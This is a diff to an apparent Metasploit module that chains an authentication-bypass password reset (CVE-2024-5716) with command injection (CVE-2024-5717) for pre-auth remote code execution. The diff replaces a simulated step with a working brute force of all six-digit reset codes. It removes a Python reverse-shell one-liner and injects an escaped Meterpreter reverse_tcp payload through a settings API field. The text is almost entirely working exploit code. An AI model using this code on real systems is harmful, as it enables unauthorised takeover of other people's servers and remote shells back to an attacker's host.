@@ -8,7 +8,7 @@ class MetasploitModule < Msf::Auxiliary
       'Description'    => %q{
         This module exploits a combination of two vulnerabilities, CVE-2024-5716 and CVE-2024-5717, to achieve pre-authentication remote code execution on a vulnerable system.
         CVE-2024-5716 is an authentication bypass vulnerability that allows an attacker to reset the admin user's password without any prior authentication. Using this, the module first resets the admin's password and logs in with the new credentials.
-        Once authenticated as the admin, the module exploits CVE-2024-5717, a command injection vulnerability, to execute arbitrary commands on the system. The payload used in this module is a Python-based reverse shell, leveraging the fact that Python is installed by default on the target system. This allows for a seamless pre-auth remote code execution, providing the attacker full control over the system.
+        Once authenticated as the admin, the module exploits CVE-2024-5717, a command injection vulnerability, to execute arbitrary commands on the system. The payload used in this module is Metasploit's meterpreter/reverse_tcp, providing the attacker full control over the system.
       },
       'Author'         => ['Janke'],
       'License'        => MSF_LICENSE,
@@ -78,8 +78,8 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("CVE-2024-5717 Remote Code Execution process initiated...")
 
-    # Send the reverse shell payload (CVE-2024-5717)
-    send_reverse_shell_payload(cookie, lhost, lport)
+    # Send the Meterpreter payload via command injection
+    send_meterpreter_payload(cookie, lhost, lport)
 
     print_status("Exploit completed, waiting for session...")
   end
@@ -96,11 +96,31 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def brute_force_reset_code(username)
-    # Simulation of brute-forcing reset code logic
-    # For demonstration purposes, let's assume it returns these values:
-    reset_code = "123456" # Example reset code
-    verification_code = "7890" # Example verification code
-    [reset_code, verification_code]
+    (0..999999).each do |i|
+      reset_code = i.to_s.rjust(6, "0")  # 6 haneli reset kodu denemesi
+      res = send_verify_reset_code_request(username, reset_code)
+      if res && res.body.include?('Success')
+        verification_code = parse_verification_code(res)
+        return [reset_code, verification_code]
+      end
+    end
+    return [nil, nil]
+  end
+
+  def send_verify_reset_code_request(username, reset_code)
+    uri = normalize_uri(target_uri.path, 'api', 'settings', 'verify_reset_code')
+    data = { 'username' => username, 'reset_code' => reset_code }
+    send_request_cgi({
+      'method' => 'POST',
+      'uri'    => uri,
+      'ctype'  => 'application/json',
+      'data'   => data.to_json
+    })
+  end
+
+  def parse_verification_code(response)
+    json = JSON.parse(response.body)
+    json['verification_code']
   end
 
   def reset_password(username, verification_code, new_password)
@@ -135,12 +155,16 @@ class MetasploitModule < Msf::Auxiliary
     res.get_cookies
   end
 
-  def send_reverse_shell_payload(cookie, lhost, lport)
-    payload = %Q(python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"#{lhost}\\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);")
+  def send_meterpreter_payload(cookie, lhost, lport)
+    # Prepare the Meterpreter payload command
+    payload_cmd = payload.encoded.gsub(/"/, '\"')  # Escape double quotes for bash command
+    payload_cmd = "bash -c \"#{payload_cmd}\""
+
+    # Use the command injection point to send the Meterpreter payload
     uri = normalize_uri(target_uri.path, 'api', 'settings', 'demo_mode')
     data = {
       'enable' => true,
-      'list' => payload
+      'list' => payload_cmd
     }
     send_request_cgi({
       'method' => 'POST',
